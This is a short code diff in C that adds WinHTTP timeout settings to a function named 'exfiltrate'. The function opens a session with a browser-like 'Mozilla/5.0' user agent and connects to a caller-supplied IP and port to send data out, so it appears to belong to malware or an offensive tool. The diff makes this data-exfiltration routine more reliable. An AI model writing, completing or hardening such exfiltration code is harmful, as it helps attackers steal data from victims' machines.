@@ -22,6 +22,10 @@ static BOOL exfiltrate(const char *ip, int port, const char *data, DWORD len) {
     HINTERNET session = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
     if (!session) return FALSE;
 
+    // Set timeouts (10s resolve, 10s connect, 10s send, 10s receive)
+    DWORD timeout_ms = 10000;
+    WinHttpSetTimeouts(session, timeout_ms, timeout_ms, timeout_ms, timeout_ms);
+
     HINTERNET conn = WinHttpConnect(session, wip, (INTERNET_PORT)port, 0);
     if (!conn) { WinHttpCloseHandle(session); return FALSE; }
 
